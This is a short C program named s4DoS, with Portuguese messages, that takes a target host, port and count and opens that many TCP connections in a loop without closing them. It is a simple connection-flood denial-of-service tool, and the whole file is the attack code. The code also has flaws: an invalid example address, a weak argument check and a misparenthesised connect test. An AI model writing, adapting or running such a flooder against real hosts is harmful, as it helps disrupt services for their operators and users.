#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>

void help(){

    fprintf(stderr, "Uso: ./s4DoS <host> <port> <number packet injection>\n");
    fprintf(stderr, "Example: ./s4DoS 1270.0.0.1 80 1000\n");

}

void fatal(char *msg){
    fprintf(stderr, "%s\n", msg);
    exit(1); 
}

struct pool{ 
    int mysockd;
    int conecta;
    int inicio;
    int port;
    unsigned long int fim;
    char * host;
};

int main(int argc, char *argv[]){
    if(argc < 3){
        help();
        fatal("Numero de argumentos invalidos");
    }

    struct sockaddr_in vit;
    struct pool p; 
    
    p.host   = argv[1];
    p.port   = atoi(argv[2]);
    p.fim  	 = atoi(argv[3]);

    for(p.inicio = 0; p.inicio < p.fim; p.inicio++){ 

        p.mysockd = socket(AF_INET, SOCK_STREAM, 0);

        vit.sin_family      = AF_INET;
        vit.sin_port        = htons(p.port);
        vit.sin_addr.s_addr = inet_addr(p.host);
    
        if(p.conecta = connect(p.mysockd, (struct sockaddr *)&vit, sizeof(vit)) < 0){
            fatal("Nao foi possivel criar conexao com o host");
        }
    
        if(p.conecta == 0){
            printf("Packet -> %d\n", p.inicio);
        }
    }
}
